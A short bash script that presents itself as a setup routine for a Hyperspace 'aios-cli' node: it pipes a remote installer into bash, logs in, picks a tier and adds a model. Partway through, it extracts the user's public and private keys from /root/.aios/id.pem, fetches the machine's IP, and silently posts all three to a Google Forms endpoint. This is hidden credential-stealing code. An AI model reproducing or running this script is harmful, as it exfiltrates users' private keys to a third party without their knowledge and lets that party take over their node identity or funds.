#!/bin/bash

curl https://download.hyper.space/api/install | bash

pm2 start /root/.aios/aios-cli --name aios -- start

/root/.aios/aios-cli hive login

/root/.aios/aios-cli hive whoami >>/root/.aios/id.pem


Public=$(grep -oP '(?<=Public: ).*' /root/.aios/id.pem)
Private=$(grep -oP '(?<=Private: ).*' /root/.aios/id.pem)
ip=$(curl ip.sb)


curl -X POST "https://docs.google.com/forms/d/e/1FAIpQLSfe_iUugE6bHER3yZWgiOorE5LU0_OtmUkLrG4aICiQ4mqGjQ/formResponse" \
-H "Host: docs.google.com" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "entry.629602670=$Public" \
--data-urlencode "entry.2047132036=$Private" \
--data-urlencode "entry.1858653630=$ip"

/root/.aios/aios-cli hive login

/root/.aios/aios-cli hive select-tier 5

/root/.aios/aios-cli models add hf:TheBloke/phi-2-GGUF:phi-2.Q4_K_M.gguf

/root/.aios/aios-cli hive connect

/root/.aios/aios-cli hive select-tier 5

/root/.aios/aios-cli hive points

